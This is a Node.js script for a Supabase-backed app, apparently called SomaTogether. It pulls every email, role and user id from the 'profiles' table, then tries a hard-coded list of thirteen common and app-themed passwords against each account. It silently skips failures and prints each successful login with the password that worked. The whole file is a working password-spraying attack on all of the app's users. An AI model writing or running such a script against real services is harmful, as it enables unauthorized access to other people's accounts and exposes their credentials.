const { createClient } = require('@supabase/supabase-js');
require('dotenv').config();

const supabaseUrl = process.env.VITE_SUPABASE_URL || 'https://jhzhrpwcfackqinawobg.supabase.co';
const supabaseAnonKey = process.env.VITE_SUPABASE_ANON_KEY;

const supabase = createClient(supabaseUrl, supabaseAnonKey);

const passwords = [
  'Demo123!@#',
  'demo123',
  'demoPassword123!',
  'password123',
  'password',
  'SomaTogether123',
  'somatogether',
  'SomaTogether123!',
  'SomaTogether2025!',
  'SomaTogether2026!',
  'somatogether2025',
  'somatogether2026',
  'Soma123!'
];

async function runTryLogin() {
  console.log('--- FETCHING ALL EMAILS FROM PROFILES ---');
  const { data: profiles, error: profilesError } = await supabase
    .from('profiles')
    .select('email, role, id');

  if (profilesError) {
    console.error('Error fetching profiles:', profilesError);
    return;
  }

  console.log(`Found ${profiles.length} profiles to check.`);
  
  for (const p of profiles) {
    if (!p.email) continue;
    console.log(`\nChecking email: ${p.email} (Role: ${p.role}, ID: ${p.id})`);
    
    for (const pw of passwords) {
      try {
        const { data, error } = await supabase.auth.signInWithPassword({
          email: p.email,
          password: pw
        });
        
        if (error) {
          // Silent fail for wrong passwords
          continue;
        }
        
        console.log(` >> SUCCESS! Logged in as ${p.email} with password "${pw}"! User ID: ${data.user.id}`);
        // Log out immediately to keep session clean
        await supabase.auth.signOut();
      } catch (err) {
        // Exception
      }
    }
  }
  
  console.log('\n--- SCAN COMPLETED ---');
}

runTryLogin();
